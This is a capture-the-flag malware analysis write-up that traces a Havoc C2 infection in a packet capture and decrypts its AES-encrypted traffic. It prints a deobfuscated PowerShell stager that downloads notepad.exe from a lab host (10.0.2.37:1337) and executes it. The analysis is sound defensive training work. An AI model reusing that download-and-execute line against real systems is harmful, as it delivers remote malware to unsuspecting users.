#thm-challenge #malwareanalysis 

Beneath the tempest's roar, a quiet grace,  
Mayhem's beauty in a h﻿idden place.  
Within the chaos, a paradox unfolds,  
A tale of beauty, in disorder it molds.

Click on the **Download Task Files** button at the top of this task. You will be provided with an **evidence.zip** file. Extract the zip file's contents and begin your analysis in order to answer the questions.

- Used 7z to extract the file: `7z e <filename>`
- Opened the `pcapng` file using Wireshark.

### Wireshark Analysis

We checked all the protocol observed, then we filtered http protocol packets to look for something interesting.

![[Pasted image 20260207184651.png]]

![[Pasted image 20260207184634.png]]

Then we observed an HTTP request to get a `install.ps1` file which upon deobfuscation reveals below code:

![[Pasted image 20260207184717.png]]

```powershell
New-Object System.Net.WebClient.DownloadFile(http://10.0.2.37:1337/notepad.exe,C:\Users\paco\Downloads\notepad.exe)

Start-Process -Filepath C:\Users\paco\Downloads\notepad.exe
```

The above code indicates a download of a notepad.exe file using a webclient and executing it when downloaded.

Then we observed a GET request to the same notepad.exe, for which in the HTTP response we observed the file content.

![[Pasted image 20260207184751.png]]

Then we extracted the `notepad.exe` from the http packet to further analyze the file.

![[Pasted image 20260207184550.png]]

### Static Analysis

#### Strings Output

Nothing notable was observed except another exe filename `demon.x64.exe`.

Checking the hash value in VT reveals the file is a highly malicious executable known as 
`trojan.havoc/havokiz`. 

![[Pasted image 20260207192138.png]]
#### Ghidra

No specific code or any findings were observed.

However based on the VT result we got to know this executable is related to Havoc trojan. Havoc Framework is a modern and malleable post-exploitation command and control framework. [GitHub - HavocFramework/Havoc: The Havoc Framework](https://github.com/HavocFramework/Havoc)

This confirms the multiple HTTP requests we observed after requesting the `notepad.exe` executable. As the traffic is encrypted hence we are unable to see the content.

As Havoc uses their own encryption key, which is already known as it is an open source project. 

The below link provides all the details on how to work against Havoc C2 from defender's perspective: [Havoc C2 Framework – A Defensive Operator’s Guide](https://www.immersivelabs.com/resources/c7-blog/havoc-c2-framework-a-defensive-operators-guide)

Based on the article the encryption keys and other details are shared in the first communication packet sent, which consists of a Magic Byte Header `0xDEADBEEF`. We were able to find this byte in the first communication packet observed in a HTTP POST request after notepad.exe was requested.

![[Pasted image 20260211214251.png]]

![[Pasted image 20260211214215.png]]

- **Length Field**: 00 00 01 13
- **Magic Byte Header**: de ad be ef
- **Agent ID**: b7 d8
- **AES Key**: 94 6c f2 f6 5a c2 d2 b8 68 32 8a 18 de dc c2 96 cc 40 fa 28 fa b4 1a 0c 34 dc c0 10 98 44 10 ca
- **AES IV**: 8c d0 0c 3e 34 92 90 56 5a aa 5a 8c 3a ac d4 30

	`For CyberChef, we needed the encryption method (AES256), the key, IV, and the mode, which we knew was CTR, since the AESCrypt.h file from Havoc’s GitHub repository indicated as much. - As mentioned in the article`.

After getting the encryption key details, we went and sorted the http traffic based on the length. Then we copied the content of the largest packet to cyberchef for decryption.

![[Pasted image 20260211220556.png]]

Then we removed few bytes one by one until we get the desired output as shown in below screenshot.

![[Pasted image 20260211220542.png]]

Similarly, we decrypted other packets in cyberchef.

![[Pasted image 20260211221124.png]]

![[Pasted image 20260211234443.png]]